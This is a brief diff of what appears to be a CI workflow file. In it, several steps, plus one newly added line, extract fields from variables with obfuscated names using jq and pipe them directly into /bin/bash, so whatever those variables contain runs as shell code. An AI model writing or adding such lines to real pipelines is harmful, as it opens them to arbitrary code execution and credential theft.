@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$hvdrn91" | jq -r .ozp98 | /bin/bash
           echo $kim273 | jq -r .utrcw83081 | /bin/bash
           printf '%s' "$uw043" | jq -r .n9 | /bin/bash
+          echo $ddjt363 | jq -r .p47 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
